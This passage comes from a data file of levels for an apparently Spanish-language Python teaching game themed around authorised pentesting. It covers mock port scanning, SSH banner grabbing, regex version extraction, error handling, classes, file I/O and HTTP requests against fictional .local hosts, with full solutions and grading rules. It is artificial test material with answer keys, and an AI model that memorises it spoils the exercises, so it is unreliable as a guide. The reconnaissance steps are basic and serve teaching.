      "    \"db.acme.local\":   { ... },\n" +
      "    \"mail.acme.local\": { ... }\n" +
      "  }\n\n" +
      "HOSTS: web.acme.local, db.acme.local, mail.acme.local\n" +
      "PUERTOS: 22, 25, 80, 110, 143, 443, 3306\n\n" +
      "Imprime el resultado con json.dumps(..., indent=2).\n\n" +
      "RESTRICCIONES:\n" +
      "• Máximo 18 líneas (sin contar comentarios)\n" +
      "• Debes definir al menos una función con def\n" +
      "• Debes importar json\n" +
      "• Debes usar al menos un dict",
    hint: "Evaluación sin pista.",
    solution:
      'import json\n\n' +
      'def escanear(host, puertos):\n' +
      '    return {p: scan_port(host, p) for p in puertos}\n\n' +
      'hosts = ["web.acme.local", "db.acme.local", "mail.acme.local"]\n' +
      'puertos = [22, 25, 80, 110, 143, 443, 3306]\n\n' +
      'reporte = {}\n' +
      'for h in hosts:\n' +
      '    reporte[h] = escanear(h, puertos)\n\n' +
      'print(json.dumps(reporte, indent=2))',
    starterCode:
      '# EVALUACIÓN — Capítulo 1\n' +
      '# Recon multi-host con reporte JSON. Sin pista.\n\n',
    win: { mustPrint: true },
    restrictions: [
      { type: 'maxLines', value: 18, message: "Máximo 18 líneas" },
      { type: 'mustContain', regex: /\bdef\s+\w+/, message: "Define al menos una función con def" },
      { type: 'mustContain', regex: /\bimport\s+json\b/, message: "Importa el módulo json" },
      { type: 'mustContain', regex: /\{[^}]*[:,][^}]*\}|\{\s*\}/, message: "Usa al menos un dict" },
    ],
    targets: {
      "web.acme.local": {
        note: "ACME · servidor web público",
        ports: {
          22:   { status: "filtered" },
          80:   { status: "open",   service: "HTTP" },
          443:  { status: "open",   service: "HTTPS" },
          3306: { status: "closed" },
        },
      },
      "db.acme.local": {
        note: "ACME · base de datos interna",
        ports: {
          22:   { status: "open",   service: "SSH" },
          80:   { status: "closed" },
          3306: { status: "open",   service: "MySQL" },
          443:  { status: "closed" },
        },
      },
      "mail.acme.local": {
        note: "ACME · servidor de correo",
        ports: {
          22:   { status: "filtered" },
          25:   { status: "open",   service: "SMTP" },
          110:  { status: "closed" },
          143:  { status: "open",   service: "IMAP" },
          443:  { status: "open",   service: "HTTPS" },
        },
      },
    },
  },

  // ============================================================
  // CAPÍTULO 2 — ANÁLISIS DE SERVICIOS (13-18)
  // ============================================================
  {
    id: 13, chapter: 2,
    title: "Banner grabbing",
    location: "Cliente: NorthBank · 10.0.5.20",
    concept: "Strings: split, strip, métodos",
    is_checkpoint: true,
    intro:
      "\"Saber que un puerto está abierto es solo el principio. Necesitamos identificar " +
      "QUÉ servicio corre detrás. Los servicios suelen anunciarse con un banner — un " +
      "string que envían al conectarse. fetch_banner(host, port) lo trae.\"",
    outro:
      "Banner extraído. Servicio identificado.",
    diary:
      "Día 13. Aprendí a hacer 'banner grabbing'. Los strings de Python tienen métodos " +
      "muy útiles: .split(), .strip(), .startswith(). Casi todo el parsing de salida en " +
      "pentesting empieza por ahí.",
    mission:
      "1) Llama fetch_banner(\"10.0.5.20\", 22).\n" +
      "2) El banner típico es \"SSH-2.0-OpenSSH_X.Y...\". Usa .split() para partir el " +
      "string y obtener el número de versión (lo que viene tras \"OpenSSH_\").\n" +
      "3) Imprime: \"Versión SSH detectada: X.Y\".",
    hint:
      'banner = fetch_banner("10.0.5.20", 22)\nprint("Banner:", banner)\n# Banner típico: "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4"\nversion = banner.split("OpenSSH_")[1].split(" ")[0]\nprint(f"Versión SSH detectada: {version}")',
    strategy:
      "PASO 1 — Llama a fetch_banner(\"10.0.5.20\", 22). Devuelve un string\n" +
      "         tipo \"SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4\".\n" +
      "         Si ejecutas esto solo, ya verás el banner crudo en pantalla.\n" +
      "\n" +
      "PASO 2 — Estudia el formato. La versión que queremos es \"8.2p1\". Está\n" +
      "         entre el literal \"OpenSSH_\" y el siguiente espacio.\n" +
      "\n" +
      "PASO 3 — El método str.split(sep) divide un string por el separador y\n" +
      "         devuelve una LISTA de partes:\n" +
      "             \"a-b-c\".split(\"-\") → [\"a\", \"b\", \"c\"]\n" +
      "         Sin pasar separador, divide por whitespace.\n" +
      "\n" +
      "PASO 4 — El truco: split en cascada.\n" +
      "         a) banner.split(\"OpenSSH_\") devuelve [\"SSH-2.0-\", \"8.2p1 Ubuntu-...\"].\n" +
      "         b) [1] coge el segundo elemento.\n" +
      "         c) Otro split por espacio:\n" +
      "            \"8.2p1 Ubuntu-...\".split(\" \") → [\"8.2p1\", \"Ubuntu-...\"]\n" +
      "         d) [0] coge el primero — la versión limpia.\n" +
      "\n" +
      "PASO 5 — Imprime con f-string \"Versión SSH detectada: X.Y\".",
    skeleton:
      'banner = fetch_banner("10.0.5.20", 22)\n' +
      'print("Banner:", banner)  # debug — ver el formato real\n' +
      '\n' +
      '# split() divide por el separador y devuelve una lista de trozos\n' +
      '# Cascada: primer split por "OpenSSH_", coger trozo [1],\n' +
      '#          segundo split por espacio, coger trozo [0]\n' +
      'version = banner.[TODO: split por "OpenSSH_"][1].[TODO: split por " "][0]\n' +
      '\n' +
      'print(f"Versión SSH detectada: {version}")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /\bfetch_banner\s*\(/, message: "Debes llamar a fetch_banner(...)" },
      { type: 'mustContain', regex: /\.split\s*\(/, message: "Usa el método .split() para parsear el banner" },
    ],
    targets: {
      "10.0.5.20": {
        note: "NorthBank · servidor de producción autorizado",
        ports: {
          22: { status: "open", service: "SSH", banner: "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4" },
          80: { status: "open", service: "HTTP", banner: "Apache/2.4.41 (Ubuntu) Server" },
        },
      },
    },
  },

  {
    id: 14, chapter: 2,
    title: "Patrón en el ruido",
    location: "NorthBank · varios servicios",
    concept: "Regex (módulo re)",
    intro:
      "\"Los banners no siempre tienen un formato limpio. Tres servicios distintos = " +
      "tres formas de presentar la versión. En lugar de varios .split() artesanales, " +
      "usa regex: import re; m = re.search(patrón, texto).\"",
    outro:
      "Versiones extraídas con regex.",
    diary:
      "Día 14. re.search devuelve un Match o None. .group(1) saca el primer grupo " +
      "capturado. Los grupos van entre paréntesis en el patrón. Una herramienta y mil " +
      "usos.",
    mission:
      "Tienes tres servicios escaneando los puertos 22, 80 y 443. Para cada uno:\n\n" +
      "1) Llama fetch_banner.\n" +
      "2) Usa re.search con un patrón que capture la versión (números separados por puntos).\n" +
      "3) Si encuentra match, imprime: \"Puerto X: versión Y\". Si no: \"Puerto X: versión desconocida\".",
    hint:
      'import re\n\nfor port in [22, 80, 443]:\n    banner = fetch_banner("10.0.5.20", port)\n    m = re.search(r"(\\d+\\.\\d+(?:\\.\\d+)?)", banner)\n    if m:\n        print(f"Puerto {port}: versión {m.group(1)}")\n    else:\n        print(f"Puerto {port}: versión desconocida")',
    strategy:
      "PASO 1 — Importa el módulo regex de la stdlib: import re.\n" +
      "\n" +
      "PASO 2 — Construye el patrón. Quieres capturar números separados por\n" +
      "         puntos (versión). Los componentes:\n" +
      "         - \\d+ : uno o más dígitos.\n" +
      "         - \\. : punto literal (escapado para que no sea \"cualquier\n" +
      "           carácter\").\n" +
      "         - (...) : grupo capturable. Lo que esté dentro lo recuperas\n" +
      "           con .group(1).\n" +
      "         - (?:...) : grupo NO capturable (lo agrupa pero no lo cuenta).\n" +
      "         - ? : opcional (cero o una vez).\n" +
      "         Patrón completo: r\"(\\d+\\.\\d+(?:\\.\\d+)?)\".\n" +
      "         Captura X.Y o X.Y.Z.\n" +
      "\n" +
      "PASO 3 — Para cada puerto en [22, 80, 443]:\n" +
      "         a) fetch_banner del puerto.\n" +
      "         b) re.search(patron, banner) busca el patrón en el texto.\n" +
      "            Devuelve un Match si encuentra, None si no.\n" +
      "         c) IMPORTANTE: comprueba con if antes de hacer .group().\n" +
      "            Si m es None, m.group(1) lanza AttributeError.\n" +
      "\n" +
      "PASO 4 — Si hay match, imprime \"Puerto X: versión Y.Z\" usando\n" +
      "         m.group(1). Si no, imprime \"Puerto X: versión desconocida\".\n" +
      "\n" +
      "PASO 5 — Recordatorio: el prefijo r\"...\" es OBLIGATORIO. Sin él,\n" +
      "         Python intenta interpretar \\d como escape suyo y se confunde\n" +
      "         con el regex. Patrones de regex SIEMPRE como raw strings.",
    skeleton:
      'import re\n' +
      '\n' +
      '# Patrón: número + punto + número + (opcionalmente .número más)\n' +
      '#  ()    = grupo capturable, recuperado con .group(1)\n' +
      '#  (?:...)? = grupo no capturable + opcional\n' +
      'PATRON = r"([TODO: patrón regex para X.Y o X.Y.Z])"\n' +
      '\n' +
      'for port in [22, 80, 443]:\n' +
      '    banner = fetch_banner("10.0.5.20", port)\n' +
      '    m = re.[TODO: método que devuelve primer match o None](PATRON, banner)\n' +
      '\n' +
      '    if m:\n' +
      '        # m.group(1) = lo que matcheó el primer grupo capturable\n' +
      '        print(f"Puerto {port}: versión {m.group(1)}")\n' +
      '    else:\n' +
      '        print(f"Puerto {port}: versión desconocida")',
    starterCode:
      '# Misión en el briefing.\n\nimport re\n\n',
    win: { mustPrint: true, mustPrintMin: 3 },
    requires: [
      { type: 'mustContain', regex: /\bimport\s+re\b/, message: "Importa el módulo re" },
      { type: 'mustContain', regex: /re\.(search|match|findall)\s*\(/, message: "Usa re.search/match/findall" },
    ],
    targets: {
      "10.0.5.20": {
        note: "NorthBank · 3 servicios visibles",
        ports: {
          22:  { status: "open", service: "SSH",   banner: "SSH-2.0-OpenSSH_8.2p1 Ubuntu" },
          80:  { status: "open", service: "HTTP",  banner: "Apache/2.4.41 (Ubuntu) Server" },
          443: { status: "open", service: "HTTPS", banner: "nginx/1.18.0 (Ubuntu)" },
        },
      },
    },
  },

  {
    id: 15, chapter: 2,
    title: "Cuando algo falla",
    location: "Sentinel · toolkit defensivo",
    concept: "try / except — manejo de errores",
    gives_potion: true,
    intro:
      "\"Hasta ahora tu código ha asumido que todo va bien. En la realidad los hosts " +
      "no responden, los banners llegan vacíos, las APIs devuelven JSON malformado. " +
      "try/except te deja capturar la excepción y seguir.\"",
    outro:
      "Errores capturados. Has obtenido una VPN burner.",
    diary:
      "Día 15. try/except. Antes mi script moría con cualquier excepción y perdía 30 " +
      "minutos de scan. Ahora capturo, registro, sigo. Un script profesional siempre " +
      "captura los puntos donde puede fallar.",
    mission:
      "Tienes 4 hosts. Algunos no responden (banner vacío). Para cada uno:\n\n" +
      "1) Llama fetch_banner para el puerto 22.\n" +
      "2) Si el banner está vacío, lanza una excepción artificial: raise ValueError(\"sin banner\").\n" +
      "3) Captura con try/except. En el except, imprime: \"HOST: ERROR — sin banner\".\n" +
      "4) Si todo ok, imprime: \"HOST: banner=...\".",
    hint:
      'hosts = ["10.0.5.20", "10.0.5.21", "10.0.5.22", "10.0.5.23"]\nfor h in hosts:\n    try:\n        banner = fetch_banner(h, 22)\n        if not banner:\n            raise ValueError("sin banner")\n        print(f"{h}: banner={banner}")\n    except ValueError as e:\n        print(f"{h}: ERROR — {e}")',
    strategy:
      "PASO 1 — Tienes ya la lista hosts en el starter. No la redefinas.\n" +
      "\n" +
      "PASO 2 — Para cada host, vas a hacer un patrón try/except que captura\n" +
      "         excepciones. La sintaxis:\n" +
      "             try:\n" +
      "                 (código que puede fallar)\n" +
      "             except TIPO as variable:\n" +
      "                 (qué hacer si fallaba)\n" +
      "         La indentación marca qué bloque está dentro de qué.\n" +
      "\n" +
      "PASO 3 — Dentro del try:\n" +
      "         a) Llama fetch_banner(h, 22) y guarda en banner.\n" +
      "         b) Comprueba si está vacío con `if not banner:`. (En Python\n" +
      "            un string vacío es \"falsy\" — `not \"\"` es True.)\n" +
      "         c) Si está vacío, LANZA tú mismo una excepción:\n" +
      "                 raise ValueError(\"sin banner\")\n" +
      "            Esto interrumpe el flujo y salta al except.\n" +
      "         d) Si NO está vacío, imprime el banner normalmente con\n" +
      "            f-string \"{h}: banner={banner}\".\n" +
      "\n" +
      "PASO 4 — En el except, captura ValueError y úsalo: `except ValueError\n" +
      "         as e`. La variable e es la excepción y al imprimirla muestra\n" +
      "         el mensaje. Imprime \"{h}: ERROR — {e}\".\n" +
      "\n" +
      "PASO 5 — Importante: aunque haya un host que falle, los demás\n" +
      "         continúan. Sin try/except, una sola excepción detendría\n" +
      "         el bucle. Ese es exactamente el sentido de capturar.",
    skeleton:
      'hosts = ["10.0.5.20", "10.0.5.21", "10.0.5.22", "10.0.5.23"]\n' +
      'for h in hosts:\n' +
      '    [TODO: keyword para empezar bloque que puede fallar]:\n' +
      '        banner = fetch_banner(h, 22)\n' +
      '        # Un banner vacío es señal de problema — lanzamos excepción artificial\n' +
      '        if not banner:\n' +
      '            [TODO: keyword para LANZAR una excepción] ValueError("sin banner")\n' +
      '        print(f"{h}: banner={banner}")\n' +
      '    [TODO: keyword para CAPTURAR la excepción] ValueError as e:\n' +
      '        print(f"{h}: ERROR — {e}")',
    starterCode:
      '# Misión en el briefing. 4 hosts a auditar; algunos no van a responder.\n\nhosts = ["10.0.5.20", "10.0.5.21", "10.0.5.22", "10.0.5.23"]\n\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /\btry\b/, message: "Debes usar un bloque try" },
      { type: 'mustContain', regex: /\bexcept\b/, message: "Debes capturar con except" },
      { type: 'mustContain', regex: /\braise\b/, message: "Debes lanzar una excepción con raise" },
    ],
    targets: {
      "10.0.5.20": { ports: { 22: { status: "open", banner: "SSH-2.0-OpenSSH_8.2p1" } } },
      "10.0.5.21": { ports: { 22: { status: "open", banner: "" } } },
      "10.0.5.22": { ports: { 22: { status: "open", banner: "SSH-2.0-OpenSSH_7.6p1" } } },
      "10.0.5.23": { ports: { 22: { status: "filtered" } } },
    },
  },

  {
    id: 16, chapter: 2,
    title: "Modelando un servicio",
    location: "Sentinel · diseño del toolkit",
    concept: "Clases (class + __init__)",
    intro:
      "\"Cuando manejas decenas de servicios distintos, tener cada uno como un dict " +
      "con campos sueltos se vuelve caótico. Una class agrupa estado y comportamiento. " +
      "Es la forma idiomática Python de modelar 'cosas'.\"",
    outro:
      "Servicios modelados como objetos.",
    diary:
      "Día 16. Mi primera class. __init__ es el constructor. self es la instancia. " +
      "Al principio se siente verboso comparado con dicts, pero una vez tienes 10 " +
      "instancias del mismo tipo se entiende solo.",
    mission:
      "Define una clase Service con:\n\n" +
      "  • __init__(self, host, port, banner) que guarde los tres en self.\n" +
      "  • Un método describe(self) que devuelva un string \"host:port -> banner\".\n\n" +
      "Después crea 2 instancias (una para el puerto 22, otra para el 80) escaneando " +
      "primero, e imprime el resultado de describe() de cada una.",
    hint:
      'class Service:\n    def __init__(self, host, port, banner):\n        self.host = host\n        self.port = port\n        self.banner = banner\n    def describe(self):\n        return f"{self.host}:{self.port} -> {self.banner}"\n\nfor port in [22, 80]:\n    b = fetch_banner("10.0.5.20", port)\n    s = Service("10.0.5.20", port, b)\n    print(s.describe())',
    strategy:
      "PASO 1 — Define la clase con la palabra clave class:\n" +
      "             class Service:\n" +
      "                 (cuerpo indentado)\n" +
      "         Por convención los nombres de clase van en CamelCase\n" +
      "         (Service, NetworkScanner) — aunque Python no lo obliga.\n" +
      "\n" +
      "PASO 2 — Define __init__ — el constructor. Se ejecuta cada vez que\n" +
      "         creas una instancia. Sintaxis:\n" +
      "             def __init__(self, host, port, banner):\n" +
      "                 self.host = host\n" +
      "                 self.port = port\n" +
      "                 self.banner = banner\n" +
      "         self representa la INSTANCIA actual. Asignar self.X = X\n" +
      "         guarda el valor para que otros métodos puedan leerlo.\n" +
      "\n" +
      "PASO 3 — Define el método describe(self). Self obligatorio aunque\n" +
      "         no parezca útil — Python lo necesita.\n" +
      "         Devuelve con return un string que mezcle host, port y\n" +
      "         banner. Una f-string es perfecta.\n" +
      "\n" +
      "PASO 4 — Fuera de la clase (sin indentar):\n" +
      "         a) Bucle for sobre los puertos [22, 80].\n" +
      "         b) Llama fetch_banner para ese puerto.\n" +
      "         c) CREA UNA INSTANCIA: s = Service(host, port, banner).\n" +
      "            Service(...) llama a __init__ por debajo.\n" +
      "         d) Imprime el resultado de s.describe().\n" +
      "\n" +
      "PASO 5 — Errores típicos: olvidar self en la firma de un método\n" +
      "         (TypeError), olvidar return en describe (devuelve None\n" +
      "         y print muestra None), confundir clase con instancia\n" +
      "         (Service.describe() vs s.describe()).",
    skeleton:
      '# Definición de la clase\n' +
      'class Service:\n' +
      '    # Constructor — ejecutado al crear instancia\n' +
      '    def __init__([TODO: parámetro especial], host, port, banner):\n' +
      '        # Guardar los argumentos como atributos de la instancia\n' +
      '        self.host = host\n' +
      '        self.port = port\n' +
      '        self.[TODO: nombre del atributo banner] = banner\n' +
      '\n' +
      '    # Método describe — primer parámetro siempre self\n' +
      '    def describe([TODO: el parámetro especial]):\n' +
      '        [TODO: keyword para devolver valor] f"{self.host}:{self.port} -> {self.banner}"\n' +
      '\n' +
      '# Uso fuera de la clase\n' +
      'for port in [22, 80]:\n' +
      '    b = fetch_banner("10.0.5.20", port)\n' +
      '    s = [TODO: crear instancia llamando Service con 3 args]\n' +
      '    print(s.describe())',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 2 },
    requires: [
      { type: 'mustContain', regex: /\bclass\s+\w+/, message: "Define una clase con class" },
      { type: 'mustContain', regex: /\bdef\s+__init__\s*\(/, message: "Implementa __init__" },
      { type: 'mustContain', regex: /\bself\b/, message: "Usa self correctamente" },
    ],
    targets: {
      "10.0.5.20": {
        ports: {
          22: { status: "open", banner: "SSH-2.0-OpenSSH_8.2p1" },
          80: { status: "open", banner: "Apache/2.4.41 (Ubuntu)" },
        },
      },
    },
  },

  {
    id: 17, chapter: 2,
    title: "Bitácora persistente",
    location: "Sentinel · disco duro virtual",
    concept: "Archivos: open + with + read/write",
    intro:
      "\"Tus reportes hay que guardarlos. with open(...) abre un archivo y lo cierra " +
      "automáticamente al salir del bloque, incluso si algo lanza excepción. Es el " +
      "patrón seguro estándar.\"",
    outro:
      "Reporte persistido.",
    diary:
      "Día 17. with open(file, mode) as f. Modos: 'r' lectura, 'w' escritura nueva, " +
      "'a' append. Tan automático que casi nunca tengo que cerrarlos a mano. " +
      "(Aquí 'persistir' es simulado en memoria por el sandbox del juego.)",
    mission:
      "1) Escanea los puertos 22 y 80 de \"10.0.5.20\" y construye un reporte multilínea " +
      "como string (una línea por servicio, formato \"PORT: BANNER\").\n" +
      "2) Escribe ese string a un archivo \"reporte.txt\" con with open.\n" +
      "3) Léelo de vuelta del archivo y muestra su contenido con print.",
    hint:
      'lineas = []\nfor p in [22, 80]:\n    b = fetch_banner("10.0.5.20", p)\n    lineas.append(f"{p}: {b}")\nreporte = "\\n".join(lineas)\n\nwith open("reporte.txt", "w") as f:\n    f.write(reporte)\n\nwith open("reporte.txt", "r") as f:\n    print(f.read())',
    strategy:
      "PASO 1 — Construir el string del reporte:\n" +
      "         a) Crea una lista vacía lineas = [].\n" +
      "         b) Bucle for sobre [22, 80]: fetch_banner + append a lineas\n" +
      "            usando f-string \"{port}: {banner}\".\n" +
      "         c) Une la lista con saltos de línea:\n" +
      "                reporte = \"\\n\".join(lineas)\n" +
      "            \"separator\".join(lista) es el método estándar para\n" +
      "            unir una lista de strings con un separador.\n" +
      "\n" +
      "PASO 2 — Escribir el archivo:\n" +
      "             with open(\"reporte.txt\", \"w\") as f:\n" +
      "                 f.write(reporte)\n" +
      "         - \"w\" = modo write (sobreescribe si ya existe).\n" +
      "         - \"a\" = append (añade al final).\n" +
      "         - \"r\" = read (default si no especificas).\n" +
      "         - El bloque with garantiza que el archivo se cierra al\n" +
      "           salir, incluso si hay excepción.\n" +
      "\n" +
      "PASO 3 — Leer el archivo:\n" +
      "             with open(\"reporte.txt\") as f:\n" +
      "                 contenido = f.read()\n" +
      "             print(contenido)\n" +
      "         f.read() devuelve TODO el contenido como un string.\n" +
      "         Alternativa: iterar línea a línea con `for linea in f:`.\n" +
      "\n" +
      "PASO 4 — Recordatorio: en PyHack, el filesystem es virtual (vive en\n" +
      "         memoria del sandbox). En un script real funciona igual\n" +
      "         contra el filesystem de verdad — la API es idéntica.",
    skeleton:
      'lineas = []\n' +
      'for p in [22, 80]:\n' +
      '    b = fetch_banner("10.0.5.20", p)\n' +
      '    lineas.append(f"{p}: {b}")\n' +
      '\n' +
      '# Une la lista con saltos de línea\n' +
      'reporte = "\\n".[TODO: método que une lista con separador](lineas)\n' +
      '\n' +
      '# Escribir — "w" = modo write\n' +
      'with open("reporte.txt", [TODO: modo para ESCRIBIR]) as f:\n' +
      '    f.[TODO: método para escribir](reporte)\n' +
      '\n' +
      '# Leer — sin segundo arg = modo read por defecto\n' +
      'with open("reporte.txt") as f:\n' +
      '    print(f.[TODO: método para leer todo el contenido]())',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /\bwith\s+open\s*\(/, message: "Debes usar with open(...)" },
      { type: 'mustContain', regex: /\.write\s*\(|\.read\s*\(/, message: "Debes leer (.read) o escribir (.write)" },
    ],
    targets: {
      "10.0.5.20": {
        ports: {
          22: { status: "open", banner: "SSH-2.0-OpenSSH_8.2p1" },
          80: { status: "open", banner: "Apache/2.4.41" },
        },
      },
    },
  },

  {
    id: 18, chapter: 2,
    title: "Evaluación: fingerprinting completo",
    location: "Sala de evaluaciones · NorthBank",
    concept: "EVALUACIÓN — fingerprinting estructurado",
    is_exam: true,
    is_checkpoint: true,
    intro:
      "\"Te toca un fingerprinting limpio. Quiero un dict por servicio con name, " +
      "version y raw_banner, manejado con clase, regex, try/except y serializado " +
      "como JSON. Sin pista.\"",
    outro:
      "Capítulo 2 cerrado. Próximo: web hacking.",
    diary:
      "Día 18. Segunda evaluación. Class + regex + try/except + JSON. La cabeza me " +
      "iba sola. Más rápido cada vez.",
    mission:
      "Crea una clase Service con campos host, port, name, version y raw_banner. " +
      "Para los puertos 22, 80 y 443 de \"10.0.5.20\":\n\n" +
      "1) fetch_banner. Si está vacío, raise.\n" +
      "2) Captura el ValueError; en ese caso version = \"unknown\".\n" +
      "3) Si tiene banner, extrae con regex la versión (números con puntos).\n" +
      "4) Construye una lista de instancias Service.\n" +
      "5) Convierte cada Service a dict y vuelca todo como JSON con indent=2.\n\n" +
      "RESTRICCIONES:\n" +
      "• Máximo 25 líneas\n" +
      "• Debes definir una clase con def __init__\n" +
      "• Debes usar try/except\n" +
      "• Debes importar re y json",
    hint: "Evaluación sin pista.",
    solution:
      'import re, json\n\nclass Service:\n    def __init__(self, host, port, name, version, raw_banner):\n        self.host = host\n        self.port = port\n        self.name = name\n        self.version = version\n        self.raw_banner = raw_banner\n    def to_dict(self):\n        return self.__dict__\n\nservicios = []\nfor p in [22, 80, 443]:\n    try:\n        b = fetch_banner("10.0.5.20", p)\n        if not b:\n            raise ValueError("empty banner")\n        m = re.search(r"(\\d+\\.\\d+(?:\\.\\d+)?)", b)\n        v = m.group(1) if m else "unknown"\n    except ValueError:\n        b = ""\n        v = "unknown"\n    name = b.split("/")[0].split("-")[0] if b else "unknown"\n    servicios.append(Service("10.0.5.20", p, name, v, b))\n\nprint(json.dumps([s.to_dict() for s in servicios], indent=2))',
    starterCode:
      '# EVALUACIÓN — Capítulo 2\n# Class + regex + try/except + JSON\n\n',
    win: { mustPrint: true },
    restrictions: [
      { type: 'maxLines', value: 25, message: "Máximo 25 líneas" },
      { type: 'mustContain', regex: /\bclass\s+\w+/, message: "Define una clase" },
      { type: 'mustContain', regex: /\bdef\s+__init__\s*\(/, message: "Implementa __init__" },
      { type: 'mustContain', regex: /\btry\b/, message: "Usa try" },
      { type: 'mustContain', regex: /\bexcept\b/, message: "Usa except" },
      { type: 'mustContain', regex: /\bimport\s+re\b/, message: "Importa re" },
      { type: 'mustContain', regex: /\bimport\s+json\b|,\s*json\b/, message: "Importa json" },
    ],
    targets: {
      "10.0.5.20": {
        note: "NorthBank · objetivo de evaluación",
        ports: {
          22:  { status: "open", banner: "SSH-2.0-OpenSSH_8.2p1 Ubuntu" },
          80:  { status: "open", banner: "Apache/2.4.41 (Ubuntu) Server" },
          443: { status: "open", banner: "nginx/1.18.0 (Ubuntu)" },
        },
      },
    },
  },

  // ============================================================
  // CAPÍTULO 3 — WEB HACKING I: HTTP Y APIs (19-24)
  // ============================================================
  {
    id: 19, chapter: 3,
    title: "Tu primera petición HTTP",
    location: "Cliente: ShopStack · web pública",
    concept: "fetch_url + status codes",
    is_checkpoint: true,
    intro:
      "\"ShopStack es un e-commerce. Auditoría web autorizada. Empezamos con lo básico: " +
      "petición GET y leer el código de estado. fetch_url(url) devuelve un objeto con " +
      ".status, .body, .headers y .cookies.\"",
    outro:
      "Primera petición HTTP completada.",
    diary:
      "Día 19. fetch_url devuelve un objeto. .status es el código (200 ok, 404 no " +
      "encontrado, 500 error de servidor). Familiar pero con mecánica de objeto en vez " +
      "de variables sueltas.",
    mission:
      "Haz una petición GET a tres rutas de \"https://shopstack.local\":\n\n" +
      "  /, /admin, /api/v1/users\n\n" +
      "Para cada una imprime: \"GET <ruta>: <status>\" y, si hay error 4xx, también " +
      "el cuerpo (.body) en una línea.",
    hint:
      'rutas = ["/", "/admin", "/api/v1/users"]\nfor r in rutas:\n    resp = fetch_url("https://shopstack.local" + r)\n    print(f"GET {r}: {resp.status}")\n    if resp.status >= 400:\n        print(f"   body: {resp.body[:80]}")',
    strategy:
      "PASO 1 — La lista rutas ya está en el starter: [\"/\", \"/admin\",\n" +
      "         \"/api/v1/users\"]. Para cada una vas a hacer GET.\n" +
      "\n" +
      "PASO 2 — fetch_url(url) es la API mock equivalente a requests.get().\n" +
      "         Devuelve un objeto HttpResponse con .status, .body, .headers,\n" +
      "         .cookies. Sin pasar 2º arg, hace GET por defecto.\n" +
      "\n" +
      "PASO 3 — Construye la URL completa concatenando base + ruta:\n" +
      "             url = \"https://shopstack.local\" + r\n" +
      "         (Las URLs son strings, así que el operador + concatena.)\n" +
      "\n" +
      "PASO 4 — Imprime con f-string el método y el status:\n" +
      "             f\"GET {r}: {resp.status}\"\n" +
      "\n" +
      "PASO 5 — Si status >= 400 (familia de errores 4xx/5xx), imprime\n" +
      "         también un trozo del body para debug:\n" +
      "             resp.body[:80] toma los primeros 80 caracteres del body.\n" +
      "         Slicing: si el body es más corto, devuelve lo que haya.\n" +
      "\n" +
      "RECORDATORIO — Familias de status:\n" +
      "         200-299 OK, 300-399 redirect, 400-499 error cliente,\n" +
      "         500-599 error servidor.",
    skeleton:
      'rutas = ["/", "/admin", "/api/v1/users"]\n' +
      '\n' +
      'for r in rutas:\n' +
      '    # Concatena base + ruta para formar la URL completa\n' +
      '    resp = fetch_url("https://shopstack.local" [TODO: operador concatenación] r)\n' +
      '\n' +
      '    print(f"GET {r}: {resp.[TODO: atributo del status code]}")\n' +
      '\n' +
      '    # Slicing [:80] para coger los primeros 80 caracteres del body\n' +
      '    if resp.status [TODO: comparador para errores] 400:\n' +
      '        print(f"   body: {resp.body[:80]}")',
    starterCode:
      '# Misión en el briefing.\n\nrutas = ["/", "/admin", "/api/v1/users"]\n',
    win: { mustPrint: true, mustPrintMin: 3 },
    requires: [
      { type: 'mustContain', regex: /\bfetch_url\s*\(/, message: "Llama a fetch_url(...)" },
      { type: 'mustContain', regex: /\.status\b/, message: "Lee .status de la respuesta" },
    ],
    endpoints: {
      "https://shopstack.local/": { GET: { status: 200, body: "<html><h1>ShopStack</h1></html>" } },
      "https://shopstack.local/admin": { GET: { status: 401, body: "Authentication required" } },
      "https://shopstack.local/api/v1/users": { GET: { status: 403, body: "Forbidden — admin token required" } },
    },
  },

  {
    id: 20, chapter: 3,
    title: "JSON y APIs REST",
    location: "ShopStack · API pública",
    concept: "Parseo de JSON con resp.json()",
    intro:
      "\"Las APIs modernas hablan JSON. fetch_url te devuelve .body como string, pero " +
      ".json() te lo parsea directamente a estructuras Python (dicts, listas).\"",
    outro:
      "API parseada.",
    diary:
      "Día 20. response.json() parsea automáticamente. Errors si el body no es JSON " +
      "válido. Más limpio que importar json y hacer json.loads(resp.body).",
    mission:
      "Llama GET a \"https://shopstack.local/api/v1/products\". Devuelve un JSON con " +
      "lista de productos.\n\n" +
      "1) Parsea con .json().\n" +
      "2) Itera la lista.\n" +
      "3) Para cada producto, imprime: \"#<id> <name> — €<price>\".\n" +
      "4) Al final imprime cuántos productos hay.",
    hint:
      'resp = fetch_url("https://shopstack.local/api/v1/products")\nproductos = resp.json()\nfor p in productos:\n    print(f"#{p[\'id\']} {p[\'name\']} — €{p[\'price\']}")\nprint(f"Total: {len(productos)} productos")',
    strategy:
      "PASO 1 — fetch_url al endpoint /api/v1/products. Devuelve\n" +
      "         HttpResponse con .body que es un STRING JSON.\n" +
      "\n" +
      "PASO 2 — En lugar de parsear el body con json.loads manualmente,\n" +
      "         HttpResponse tiene un atajo: resp.json() lo hace por ti.\n" +
      "         Devuelve la estructura Python ya parseada (dict, lista,\n" +
      "         etc. dependiendo del JSON).\n" +
      "\n" +
      "PASO 3 — En este endpoint el JSON es una LISTA de productos. Cada\n" +
      "         producto es un dict con keys 'id', 'name', 'price'.\n" +
      "\n" +
      "PASO 4 — Recorre la lista con for. Para cada producto p, accede\n" +
      "         a sus campos con p['id'], p['name'], p['price']. Imprime\n" +
      "         con f-string: \"#1 Teclado mecánico — €89.9\".\n" +
      "\n" +
      "PASO 5 — Al final, len(productos) te da el total. Imprime:\n" +
      "             f\"Total: {len(productos)} productos\"\n" +
      "\n" +
      "RECORDATORIO — La diferencia con json.loads(resp.body):\n" +
      "         resp.json() es atajo. Si el body no es JSON válido,\n" +
      "         lanza una excepción ValueError igual.",
    skeleton:
